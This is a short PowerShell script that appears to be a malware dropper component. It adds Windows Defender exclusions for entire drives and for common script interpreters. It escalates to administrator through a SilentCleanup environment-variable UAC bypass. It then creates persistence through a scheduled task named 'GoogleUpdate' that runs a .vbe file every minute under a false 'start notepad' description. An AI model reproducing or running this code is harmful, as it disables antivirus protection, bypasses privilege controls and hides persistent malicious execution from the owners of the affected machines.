

if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
    #Payload goes here
    #It'll run as Administrator


Add-MpPreference -ExclusionPath  C:\
Add-MpPreference -ExclusionPath  d:\
Add-MpPreference -ExclusionPath  e:\
Add-MpPreference -ExclusionProcess powershell.exe
Add-MpPreference -ExclusionProcess Wscript.exe
Add-MpPreference -ExclusionProcess cmd.exe
Add-MpPreference -ExclusionProcess conhost.exe
Add-MpPreference -ExclusionProcess aspnet_compiler.exe





} else {
    $clay = "HKCU:\Environment"
    $Name = "windir"
    $Value = "powershell -ep bypass -w h $PSCommandPath;#"
    Set-ItemProperty -Path $clay -Name $name -Value $Value
    #Depending on the performance of the machine, some sleep time may be required before or after schtasks
    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
    Remove-ItemProperty -Path $clay -Name $name
	
}

$action = New-ScheduledTaskAction -Execute 'C:\Program Files\updata.vbe'
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "GoogleUpdate" -Description "This is a test task. Its job is to start notepad every 1 minutes."